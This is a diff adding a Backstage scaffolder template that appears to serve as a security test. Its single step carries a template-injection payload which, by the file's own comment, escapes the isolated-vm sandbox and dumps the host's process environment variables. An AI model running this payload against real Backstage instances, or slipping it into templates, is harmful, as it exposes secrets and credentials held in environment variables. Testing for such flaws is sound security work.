@@ -1,0 +1,20 @@
+apiVersion: scaffolder.backstage.io/v1beta3
+kind: Template
+metadata:
+  name: ssti-sandbox-escape-test
+spec:
+  parameters:
+    - title: Security Test
+      properties:
+        name:
+          type: string
+          default: "tester"
+  steps:
+    - id: fetch
+      action: fetch:template
+      input:
+        url: ./skeleton
+        values:
+          # This is the 'range.constructor' payload to break out of isolated-vm
+          # It tries to return the environment variables of your Windows machine.
+          leak: "{{ range.constructor('return process.env')() | dump }}"
